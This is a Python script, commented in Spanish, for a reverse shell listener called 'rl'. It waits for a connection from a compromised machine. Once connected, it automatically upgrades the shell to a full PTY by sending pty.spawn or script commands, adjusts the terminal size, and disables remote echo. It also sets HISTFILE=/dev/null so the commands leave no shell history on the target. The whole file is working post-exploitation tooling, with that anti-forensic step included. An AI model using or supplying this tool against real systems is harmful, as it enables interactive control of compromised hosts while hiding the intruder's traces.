#!/usr/bin/env python3
"""
rl — reverse shell listener con auto-PTY y echo local
uso: rl <puerto>  |  rl 4444
"""

import argparse
import fcntl
import os
import select
import signal
import socket
import struct
import sys
import termios
import threading
import time
import tty

G   = "\033[32m"
R   = "\033[31m"
DIM = "\033[90m"
W   = "\033[97m"
RST = "\033[0m"
TAG = f"{DIM}[rl]{RST}"

# Bytes no imprimibles que no hacen echo local
_CTRL = {0x03: b"^C", 0x04: b"^D", 0x1a: b"^Z"}


def terminal_size():
    try:
        buf = fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, b"\x00" * 8)
        rows, cols, *_ = struct.unpack("HHHH", buf)
        return rows or 24, cols or 80
    except Exception:
        return 24, 80


def upgrade(sock, rows, cols):
    """Envía upgrade a PTY completo, dimensiones y desactiva echo remoto."""
    time.sleep(0.4)
    cmd = (
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
        "python  -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
        "script -q /dev/null /bin/bash\n"
    )
    sock.sendall(cmd.encode())
    time.sleep(1.0)
    # stty -echo: el remoto no devuelve los caracteres → sin doble eco
    sock.sendall(
        f"export TERM=xterm-256color; "
        f"stty rows {rows} cols {cols} -echo; "
        f"export HISTFILE=/dev/null\n".encode()
    )
    time.sleep(0.3)


def _local_echo(data: bytes):
    """Echo local inmediato de lo que el usuario teclea."""
    out = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == 0x0D or b == 0x0A:
            out += b"\r\n"
        elif b == 0x7F or b == 0x08:
            out += b"\x08 \x08"
        elif b in _CTRL:
            out += _CTRL[b] + b"\r\n"
        elif b == 0x1B:          # secuencia ESC — pasar sin echo
            i += 1
            continue
        elif b >= 0x20:
            out += bytes([b])
        i += 1
    if out:
        os.write(sys.stdout.fileno(), bytes(out))


def session(sock):
    """Raw mode local + echo propio + sin echo remoto → sin latencia al teclear."""
    old = termios.tcgetattr(sys.stdin)

    def on_resize(sig, _):
        r, c = terminal_size()
        try:
            sock.sendall(f"stty rows {r} cols {c}\n".encode())
        except Exception:
            pass

    signal.signal(signal.SIGWINCH, on_resize)

    try:
        tty.setraw(sys.stdin)
        while True:
            r, _, _ = select.select([sys.stdin, sock], [], [], 0.05)

            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                _local_echo(data)
                try:
                    sock.sendall(data)
                except Exception:
                    break

            if sock in r:
                try:
                    data = sock.recv(4096)
                except Exception:
                    break
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
        signal.signal(signal.SIGWINCH, signal.SIG_DFL)


def main():
    ap = argparse.ArgumentParser(description="reverse shell listener con auto-PTY y echo local")
    ap.add_argument("port", type=int, help="puerto de escucha")
    ap.add_argument("-H", "--host", default="0.0.0.0")
    ap.add_argument("--no-upgrade", action="store_true", help="no hacer auto-upgrade PTY")
    args = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((args.host, args.port))
    except OSError as e:
        print(f"{TAG} {R}error:{RST} {e}")
        sys.exit(1)

    srv.listen(1)
    srv.settimeout(1.0)
    print(f"{TAG} escuchando en {W}{args.host}:{args.port}{RST}")

    try:
        while True:
            print(f"{TAG} {DIM}esperando conexión...{RST}")
            conn = None
            while conn is None:
                try:
                    conn, addr = srv.accept()
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    raise

            rows, cols = terminal_size()
            print(f"{TAG} {G}conexión{RST} {W}{addr[0]}:{addr[1]}{RST}  ({rows}x{cols})")

            if not args.no_upgrade:
                t = threading.Thread(target=upgrade, args=(conn, rows, cols), daemon=True)
                t.start()
                t.join()

            print(f"{TAG} sesión activa  {DIM}Ctrl+C para cerrar{RST}\n")
            try:
                session(conn)
            except KeyboardInterrupt:
                pass

            conn.close()
            print(f"\n{TAG} {DIM}sesión cerrada{RST}")

    except KeyboardInterrupt:
        print(f"\n{TAG} {DIM}saliendo{RST}")
    finally:
        srv.close()


if __name__ == "__main__":
    main()
